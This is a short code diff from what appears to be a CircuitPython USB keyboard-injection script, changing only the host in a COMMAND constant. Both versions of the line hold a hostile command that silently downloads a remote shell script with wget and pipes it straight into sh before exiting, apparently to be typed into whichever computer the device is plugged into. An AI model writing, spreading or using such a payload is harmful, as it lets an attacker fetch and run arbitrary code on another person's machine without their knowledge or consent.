@@ -7,7 +7,7 @@ import board
 import digitalio
 import time
 
-COMMAND = "wget -q -O - https://rr.paulsen.ooo/cr.sh | sh && exit"
+COMMAND = "wget -q -O - https://rr.plattfis.ch/cr.sh | sh && exit"
 
 keyboard = Keyboard(usb_hid.devices)
 
